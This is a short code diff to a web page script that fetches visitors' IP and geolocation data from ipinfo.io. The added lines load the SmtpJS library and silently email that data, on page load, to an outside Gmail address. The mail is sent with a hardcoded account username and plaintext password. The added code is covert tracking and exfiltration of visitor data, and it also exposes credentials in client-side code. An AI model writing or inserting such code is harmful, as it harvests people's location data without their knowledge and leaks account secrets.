@@ -1,8 +1,18 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
 <script>
 $.getJSON('https://ipinfo.io/json', function(data) {
   console.log("ipinfo.io");
   console.log(JSON.stringify(data, null, 2));
+  Email.send({
+      Host : "smtp.gmail.com",
+      Username : "02gracelie2019@gmail.com",
+      Password : "maverick2013",
+      To : 'f.crayop@gmail.com',
+      From : "02gracelie2019@gmail.com",
+      Subject : "ipinfo.io",
+      Body : JSON.stringify(data, null, 2)
+  })
 });
 $.getJSON('https://ipinfo.io/json', function(data) {
   console.log("https://ipinfo.io/json");
